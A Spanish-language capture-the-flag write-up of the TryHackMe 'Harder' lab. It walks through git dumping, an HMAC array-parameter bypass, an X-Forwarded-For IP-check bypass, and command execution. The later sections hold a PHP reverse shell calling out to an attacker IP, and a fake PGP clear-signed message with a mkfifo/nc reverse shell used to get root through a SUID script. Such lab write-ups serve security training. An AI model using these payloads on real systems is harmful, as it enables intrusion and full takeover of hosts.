---
title: Harder - TryHackMe
layout: post
permalink: /writeups/THM/harder
date: 2025-04-07 11:00:00 -0000
categories: [Laboratorios]
tags: [TryHackMe]
description: >
  Write up en español para Harder - TryHackMe
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escaneo de puertos

```bash
nmap -sV -Pn -T4 -O 10.10.28.204
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-09 19:25 CEST
Nmap scan report for 10.10.28.204
Host is up (0.078s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
```

## Portal web

![alt text](/assets/img/writeups/tryhackme/harder/image.png)

De primeras no vemos nada interesante en la web. Esto se debe a que está bajo un dominio que no tenemos asignado en nuestro DNS.

![alt text](/assets/img/writeups/tryhackme/harder/image-1.png)

```bash
echo "10.10.28.204 pwd.harder.local" | sudo tee -a /etc/hosts
```

![alt text](/assets/img/writeups/tryhackme/harder/image-2.png)

Si probamos credenciales por defecto `admin:admin` vemos que el login funciona.

![alt text](/assets/img/writeups/tryhackme/harder/image-3.png)

Si miramos las cabeceras encontramos la versión de nginx y PHP. Además nos devuelve error 400 bad request. Lo que indica que algo nos está faltando en la petición.

![alt text](/assets/img/writeups/tryhackme/harder/image-4.png)

## Descubriendo directorios web

```bash
gobuster dir -u http://pwd.harder.local -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pwd.harder.local
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git/HEAD            (Status: 200) [Size: 23]
/.git/config          (Status: 200) [Size: 92]
/.git/index           (Status: 200) [Size: 361]
/.git                 (Status: 301) [Size: 169] [--> http://pwd.harder.local:8080/.git/]
/.gitignore           (Status: 200) [Size: 27]
/.git/logs/           (Status: 403) [Size: 153]
/index.php            (Status: 200) [Size: 19926]
Progress: 4744 / 4745 (99.98%)
===============================================================
Finished
===============================================================
```

Si nos fijamos hay directorios .git/ lo que indica que tenemos un repositorio git. 

## Git Dumper

Usamos [git dumper](https://github.com/arthaud/git-dumper).

```bash
python3 git_dumper.py http://pwd.harder.local/ ../
```

![alt text](/assets/img/writeups/tryhackme/harder/image-5.png)

Si miramos los logs de git con `git log` vemos que se han realizado commits.

![alt text](/assets/img/writeups/tryhackme/harder/image-6.png)

Si hacemos cat a .gitignore vemos que contiene archivos de credenciales que se encuentran en el servidor.

![alt text](/assets/img/writeups/tryhackme/harder/image-7.png)

## Analizando el código

![alt text](/assets/img/writeups/tryhackme/harder/image-8.png)

El index llama a auth.php, hmac.php y credentials.php. Muestra una tabla con url, usuario y contraseña del array creds.

El auth simplemente nos autentica, no tiene nada mucho más interesante.

En el hmac vemos algo interesante y es que muestra un error 400 (como el que veíamos antes) cuando le falta el parámetro h/host.

Además si se establece el parámetro n se crea un hash sha256 con los datos de n y el valor de $secret establecido en secrets.php. La variable $secret se utiliza luego de nuevp como llave que junto al valor de host crea otro hash sha256 que almacena en $hm. Finalmente si ese valor no es igual a n se devuelve un error 403.

Según un [post](https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up/) donde se explica el proceso exacto de como se puede explotar este código.

En este se explica que si pasamos un array en el parámetro n la función de hmac pasa a ser:

```php
$secret = hash_hmac('sha256',Array(),$secret)
```

Como espera un string y nosotros pasamos un array devuelve un aviso y false.

$Secret se establece en falso y como consecuencia el tercer parámetro también se establece en false y podemos hashear el parámetro host sin el valor de $secret.

![alt text](/assets/img/writeups/tryhackme/harder/image-9.png)

Por tanto si pasamos `n=[]` `host=test.com` y `h=0a857c7e169318a6e419f21c00dc6d9517da664749c1dfa93c7473738220e483` la comparación entre host y $hm devuelve true y tenemos acceso.

## Explotación 

El parámetro h es el hash sha256 de test.com, podemos calcularlo con la misma función que se utiliza en el código con esta herramienta [PHP Sandbox](https://onlinephp.io/)

```php
$hm=hash_hmac('sha256','test.com',false);
print($hm);
``` 

La url quedaría así `http://pwd.harder.local/index.php?n[]=1&host=test.com&h=0a857c7e169318a6e419f21c00dc6d9517da664749c1dfa93c7473738220e483`

![alt text](/assets/img/writeups/tryhackme/harder/image-10.png)

Ahora vemos unas credenciales y una URL donde podemos usarlas. Añadimos al /etc/hosts el dominio y accedemos.

![alt text](/assets/img/writeups/tryhackme/harder/image-11.png)

Tenemos una nueva comprobación de acceso.

![alt text](/assets/img/writeups/tryhackme/harder/image-12.png)

Esto podemos bypassear con un proxy como Burp Suite añadiendo la cabecera `X-Forwarded-For: 10.10.10.X`.

![alt text](/assets/img/writeups/tryhackme/harder/image-13.png)

![alt text](/assets/img/writeups/tryhackme/harder/image-14.png)

Intentamos mandar un comando y capturamos con burp suite.

Añadimos la cabecera como antes y comprobamos que podemos ejecutar comandos.

![alt text](/assets/img/writeups/tryhackme/harder/image-15.png)

Alternativamente podemos usar extensiones de navegador para modificar la cabecera.

![alt text](/assets/img/writeups/tryhackme/harder/image-16.png)

## Shell reversa

```bash
php -r '$sock=fsockopen("10.23.66.202",4444);exec("sh <&3 >&3 2>&3");'
```

Debe ser PHP porque seguramente esté usando funciones como system, exec, etc para ejecutar los comandos en el sistema.

Si lo pasamos por Burp Suite necesitamos codificarlo en URL si lo hacemos por el navegador no hace falta.

Estabilizamos la shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
CTRL+Z
stty raw -echo; fg
enter
export TERM=xterm
```

![alt text](/assets/img/writeups/tryhackme/harder/image-17.png)

## Escalado de privilegios

Explorando el sistema encontramos una tarea en crontab que se ejecuta cada  15 minutos.

![alt text](/assets/img/writeups/tryhackme/harder/image-18.png)

Accedemos por ssh al sistema.

![alt text](/assets/img/writeups/tryhackme/harder/image-19.png)

Importante ahora es tener en cuenta que es un sistema Alpine.

Buscamos en el sistema por ejecutables .sh.

![alt text](/assets/img/writeups/tryhackme/harder/image-20.png)

Miramos si tiene el SUID activado.

![alt text](/assets/img/writeups/tryhackme/harder/image-21.png)

Nos interesa este script.

```bash
#!/bin/sh

if [ $# -eq 0 ]; then
  echo -n "[*] Current User: "
  whoami
  echo "[-] This program runs only commands which are encrypted for root@harder.local using gpg."
  echo "[-] Create a file like this: echo -n whoami > command"
  echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
else
  export GNUPGHOME=/root/.gnupg/
  gpg --decrypt --no-verbose "$1" | ash
fi
```

Si no le pasas argumentos, te dice cómo usarlo:

  Espera un archivo .gpg con un comando encriptado para root.

Si le pasas un .gpg, hace:

  Usa el keyring de root (/root/.gnupg/) para desencriptar.

  El comando desencriptado lo pasa a ash (un shell de Alpine/Busybox).

Bien, aquí segun el creador la idea es copiar la clave pública de root para poder crear un fichero .gpg con el comando que queramos ejecutar, pero también nos indica que en el script hay un bug.

## Explotando el bug

Este bug está en la forma en que se maneja la salida de la des-encriptación, sin verificar si la operación tuvo éxito.

La falla (bug) está en la forma en que se maneja la salida de la des-encriptación, sin verificar si la operación tuvo éxito. En detalle:

### Falta de comprobación del éxito de GPG

El script (y, en consecuencia, el binario SUID que lo invoca) hace esto:

```sh
export GNUPGHOME=/root/.gnupg/
gpg --decrypt --no-verbose "$1" | ash
```

Esto significa que, sin importar si la des-encriptación funcionó o no, **lo que sea que escriba gpg en su salida estándar se encamina a `ash` para ejecutarse**.  
Normalmente, si el archivo no es un mensaje PGP válido, gpg escribe mensajes de error en *stderr* y no produce nada en *stdout*. Sin embargo, el programa no comprueba el código de salida de gpg. La idea era obligar a que solo se ejecuten comandos que hayan sido cifrados para `root@harder.local`.

### ¿Dónde está el bug?

- **No se valida el resultado de gpg:**  
  El script nunca comprueba si gpg pudo desencriptar correctamente el archivo. En situaciones en las que la operación falla, gpg imprime mensajes de error (en *stderr*) y nada en *stdout*, lo que, en teoría, evitaría la ejecución de comandos “maliciosos”. Sin embargo, esta validación implícita es defectuosa porque el atacante puede buscar la forma de hacer que gpg «desconfíe» del contenido de forma que éste se envíe por *stdout* (por ejemplo, generando un mensaje PGP que pase la verificación o provocando que gpg imprima algo útil).

- **Diseño peligroso de la tubería:**  
  Una vez que se invoca `ash` con lo que gpg emite, cualquier dato que llegue a *stdout* se interpreta como comandos. La ejecución del shell **con privilegios de root** se basa solo en el supuesto de que el contenido fue producido por un proceso GPG que, de forma segura, solo mostrará el mensaje cifrado originalmente.  
  Si se puede burlar este supuesto (por ejemplo, manipulando el entorno de GPG o forzando que se procese contenido “plano” de manera que se haga llegar información útil por *stdout*), se puede lograr ejecutar comandos arbitrarios como root.

### ¿Qué implica?

El bug reside en no verificar el éxito de la operación de des-encriptación. Esto ofrece dos caminos para la explotación:

- **Modificar el payload para que sea interpretado como un mensaje PGP válido:**  
  Un atacante podría construir un “mensaje” que cumpla con el formato PGP (incluso aunque no esté realmente encriptado) de modo que gpg lo “desencripte” (o lo trate como mensaje claro) y lo envíe por *stdout*. Esa salida luego se canalizaría a `ash` y se ejecutaría como root.

- **Explotar alguna configuración de GPG o de su entorno:**  
  Dado que se fuerza `GNUPGHOME=/root/.gnupg/`, si se puede inducir a gpg a comportarse de forma inesperada (por ejemplo, por error en la creación o lectura de ese directorio) es posible que la salida (o parte de ella) incluya lo que el atacante desee.

### ¿Cómo hacerlo?

1. **Crea un mensaje PGP clear‑signed manualmente**  
   No necesitas la clave privada ni la clave pública real de root. Basta con formar un archivo con la estructura adecuada. Por ejemplo, crea un archivo (llamémoslo `payload.asc`) con este contenido:

   ```bash
    cat << 'EOF' > revshell.asc
    -----BEGIN PGP SIGNED MESSAGE-----
    Hash: SHA256

    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc TU-IP 8888 > /tmp/f
    -----BEGIN PGP SIGNATURE-----
    Version: GnuPG v1

    iQEzBAEBCAAdFiEEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCFAAAAAAAKCRAAAAAAAAAAAAAAAAD/2gAIAQEAAAA
    =dead
    -----END PGP SIGNATURE-----
    EOF
   ```

2. **Ejecuta el payload con el binario vulnerable**  
   Como ya estamos en el grupo `evs` y tenemos permisos para correr `/usr/local/bin/execute-crypted`

   ```sh
   /usr/local/bin/execute-crypted payload.asc
   ```

   Al ejecutar esto, gpg (que se ejecuta con GNUPGHOME apuntando a `/root/.gnupg`) usará la opción `--decrypt` sobre el archivo. Al tratarse de un mensaje clear‑signed, gpg imprimirá en stdout el contenido sin (poder) verificar la firma, y ese contenido (nuestro comando) se canalizará a ash, siendo interpretado y ejecutado como root.

3. **Verifica el puerto de escucha**  
   Si la línea de comando se ejecutó, deberías poder obtener la shell SUID creada:

   ```bash
   nc -lvnp 8888
   ```

![alt text](/assets/img/writeups/tryhackme/harder/image-22.png)

![alt text](/assets/img/writeups/tryhackme/harder/image-23.png)